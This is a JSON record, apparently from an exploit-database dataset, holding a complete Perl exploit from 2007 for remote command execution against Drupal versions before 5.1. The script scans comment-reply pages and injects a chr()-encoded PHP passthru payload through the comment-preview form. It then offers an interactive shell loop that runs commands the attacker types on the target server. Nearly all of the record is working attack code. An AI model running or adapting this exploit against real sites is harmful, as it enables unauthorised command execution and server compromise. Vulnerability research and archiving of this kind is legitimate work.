{
  "id": "3312",
  "title": "Drupal &lt; 5.1 - Post Comments Remote Command Execution",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n\r\n#\r\n# $Id: milw0rm_drupalv5.pl,v 0.2 2007/02/15 13:40:29 str0ke Exp $\r\n# \r\n# milw0rm_drupalv5.pl - Drupal < 5.1 Remote Command Execution Exploit\r\n# Copyright (c) 2007 str0ke <str0ke[!]milw0rm.com>\r\n# \r\n# Description\r\n# -----------\r\n# Previews on comments were not passed through normal form validation routines,\r\n# enabling users with the 'post comments' permission and access to more than one\r\n# input filter to execute arbitrary code. By default, anonymous and authenticated\r\n# users have access to only one input format.\r\n# Immediate workarounds include: disabling the comment module, revoking the 'post \r\n# comments' permission for all users or limiting access to one input format.\r\n# Versions affected\r\n# -----------------\r\n# - Drupal 5.x versions before Drupal 5.1\r\n#\r\n# [02/15/2007] The exploit has been fixed. /str0ke\r\n#\r\n\r\nuse strict;\r\nuse LWP::UserAgent;\r\n\r\nmy $host  = shift || &usage;\r\nmy $dir   = shift || \"/drupal\";\r\nmy $proxy = shift;\r\nmy $command;\r\n\r\nmy $conn = LWP::UserAgent->new();\r\n$conn -> proxy(\"http\", \"http://\".$proxy.\"/\") unless !$proxy;\r\n\r\nsub usage() \r\n{\r\n\tprint \"[?] Drupal < 5.1 Remote Command Execution Exploit\\n\";\r\n\tprint \"[?] Copyright (c) 2007 str0ke <str0ke[!]milw0rm.com>\\n\";\r\n\tprint \"[?] usage: perl $0 [host] [directory] [proxy]\\n\";\r\n\tprint \"    [host] (ex. www.milw0rm.com)\\n\";\r\n\tprint \"    [directory] (ex. /drupal)\\n\";\r\n\tprint \"    [proxy] (ex. 0.0.0.0:8080)\\n\";\r\n\texit;\r\n}\r\n\r\nsub exploit() \r\n{\r\n\tmy $i = $_[0];\r\n\tmy $command = $_[1] || 'ls -l';\r\n\tmy $cmd     = 'echo start_er;'.$command.';'.'echo end_er';\r\n\r\n\tmy $byte = join('.', map { $_ = 'chr('.$_.')' } unpack('C*', $cmd));\r\n\t\r\n\tmy $req = HTTP::Request->new(POST => \"http://\" . $host . $dir . \"/?q=comment/reply/\" . $i);\r\n\t$req -> content_type('application/x-www-form-urlencoded');\r\n\t$req -> content('subject=My daddy beats me&comment=<?passthru('.$byte.');?>&format=2&form_id=comment_form&op=Preview comment');\r\n\r\n\tmy $content = $conn->request($req);\r\n\t\r\n\tif ($content->content =~ m/start_er(.*?)end_er/ms) {\r\n\t\tmy $out = $1;\r\n\r\n\t\tif ($out) {\r\n\t\t\tprint \"$out\\n\";\r\n\t\t} else {\r\n\t\t\tprint \"[-] Exploit Failed...\\n\";\r\n\t\t\texit;\r\n\t\t}\t\r\n\t}\t\r\n}\r\n\r\nfor my $i ( 1 .. 400 ) {\r\n\tmy $output = $conn -> get(\"http://\" . $host . $dir . \"/?q=comment/reply/\" . $i);\r\n\r\n\tif($output -> is_success)\r\n\t{\r\n\t\tif($output -> content =~ /add new comment/)\r\n\t\t{\r\n\t\t\tprint \"[+] found comment/reply: $i\\n\";\r\n\r\n\t\t\t&exploit($i);\r\n\t\t\t\r\n\t\t\twhile()\r\n\t\t\t{\r\n\t\t\t\tprint \"str0kin-drupal\\$ \";\r\n\t\t\t\tchomp($command = <STDIN>);\r\n\t\t\t\texit unless $command;\r\n\t\t\t\t&exploit($i, $command);\r\n\t\t\t}\r\n\t\t\texit;\r\n\t\t}\r\n\t}\r\n}\r\n\r\nprint \"[-] Exploit Failed...\\n\";\r\n\r\n# milw0rm.com [2007-02-15]",
  "url": "https://www.exploit-db.com/exploits/3312"
}